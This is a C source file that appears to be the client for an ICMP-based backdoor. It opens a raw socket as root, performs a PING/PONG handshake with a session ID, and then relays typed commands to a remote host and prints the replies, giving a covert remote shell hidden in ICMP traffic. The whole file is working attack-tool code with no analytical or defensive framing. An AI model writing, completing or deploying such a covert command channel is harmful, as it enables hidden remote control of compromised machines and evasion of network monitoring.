#include "config.h"

extern void sendpacket(char *, char *, int);

int main(int argc, char **argv) {

	int afds, maxFd, null = 0, auth = 0;
	int cliseq = CLISEQ, srvseq = SRVSEQ;
	char host[256], *payload, text[CHAR];
	u_char buf[1024];
	fd_set rset;

	if (argc < 3) 
		printf("usage: client <host> <code> \n"), exit(1);
	
	if (getuid() != 0) 
		printf("you should be root\n"), exit(-1);
	
	icmpcode = atoi(argv[2]);

	temp = GetHostByName(argv[1]);
	strncpy(host,inet_ntoa(*(struct in_addr*)temp->h_addr_list[0]),256);

	rawsock = GetRawSock();

	maxFd = rawsock;
	FD_ZERO(&rset);

	sendpacket(PING, host, cliseq);

	for (;;) {
		FD_SET(rawsock, &rset);
		FD_SET(STDIN_FILENO, &rset);
		afds = Select((maxFd + 1), &rset);

		if (FD_ISSET(rawsock, &rset)) {
			memset(buf, 0, sizeof(buf));
			if (recvfrom(rawsock, buf, 1024, 0, (struct sockaddr *)&saddr, &null) < 0) break;
			ip = (struct ip*)buf;
			icmp = (struct icmp*)&buf[ip->ip_hl << 2];

			if (icmp->icmp_seq == srvseq) {
				if (!strcmp(host, inet_ntoa(ip->ip_src))) {
					payload = (char *)(buf + sizeof(struct ip) + sizeof(struct icmp));

					if (!strncmp(payload, SID, strlen(SID))) {
						payload = payload + strlen(SID);
						if (!strcmp(payload, PONG))
							fprintf(stderr, "connected.\n\n# "), auth++;
						else if (auth)
							fprintf(stderr, "%s", payload);
					}
				}
			}

		} else if (FD_ISSET(STDIN_FILENO, &rset)) {
			memset(text, 0, CHAR);
			read(STDIN_FILENO, text, CHAR - 1);

			if (strncmp(text, "exit", 4)) 
				sendpacket(text, host, cliseq);
			else 
				fprintf(stderr, "\nbye\n"), exit(1);
		}

	}

	return 0;
}
